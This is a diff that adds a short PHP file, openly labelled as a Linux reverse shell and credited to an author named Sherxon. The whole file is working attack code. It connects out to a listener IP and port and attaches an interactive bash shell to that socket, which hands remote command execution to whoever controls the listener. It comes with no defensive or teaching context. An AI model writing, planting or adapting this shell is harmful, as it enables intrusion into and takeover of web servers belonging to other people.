@@ -1,0 +1,18 @@
+<?php
+// PHP Reverse Shell (Linux compatible)
+// Author: Sherxon
+
+$ip = '192.168.0.104'; // Your listener IP address
+$port = 4444;          // Your listener port
+
+$sock = fsockopen($ip, $port);
+if (!$sock) {
+    die("Connection failed...");
+}
+
+$proc = proc_open('/bin/bash -i', array(
+    0 => $sock,
+    1 => $sock,
+    2 => $sock
+), $pipes);
+?>
